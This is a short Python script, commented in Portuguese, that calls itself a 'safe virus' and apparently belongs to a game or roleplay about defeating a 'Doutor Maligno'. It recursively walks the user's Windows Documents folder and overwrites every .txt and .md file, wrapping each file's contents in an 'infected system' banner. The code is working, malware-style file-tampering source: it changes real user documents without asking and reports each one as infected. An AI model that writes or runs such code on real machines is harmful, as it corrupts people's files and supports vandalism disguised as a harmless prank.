#!/usr/bin/env python3
# infecta_textos_windows.py
# "Vírus" seguro: sobrescreve arquivos .txt e .md em um diretório padrão do Windows.
# ATENÇÃO: altera arquivos de verdade, apenas de texto.

import os
from pathlib import Path
from datetime import datetime

ASSINATURA = """
===========================================
  SISTEMA INFECTADO PELA EQUIPE DA CAMADA FINAL
  Doutor Maligno derrotado às {hora}
===========================================
"""

def infectar_arquivo(caminho: Path):
    try:
        with open(caminho, "r", encoding="utf-8", errors="ignore") as f:
            conteudo = f.read()
    except Exception as e:
        print(f"[ERRO] Não foi possível ler {caminho}: {e}")
        return

    novo_conteudo = (
        ASSINATURA.format(hora=datetime.utcnow().isoformat()) +
        "\n" + conteudo + "\n" +
        ASSINATURA.format(hora=datetime.utcnow().isoformat())
    )

    try:
        with open(caminho, "w", encoding="utf-8") as f:
            f.write(novo_conteudo)
        print(f"[INFECTADO] {caminho}")
    except Exception as e:
        print(f"[ERRO] Não foi possível sobrescrever {caminho}: {e}")

def percorrer_diretorio(diretorio: Path):
    for arquivo in diretorio.rglob("*"):
        if arquivo.is_file() and arquivo.suffix.lower() in [".txt", ".md"]:
            infectar_arquivo(arquivo)

if __name__ == "__main__":
    user_profile = Path(os.environ["USERPROFILE"])
    # Escolha o diretório padrão (Desktop ou Documents)
    diretorio_padrao = user_profile / "Documents"   # pode trocar por "Desktop"

    print(f"[INFO] Iniciando infecção no diretório padrão: {diretorio_padrao}")
    percorrer_diretorio(diretorio_padrao)
    print("\n>>> Infecção concluída pela Equipe da Camada Final <<<")
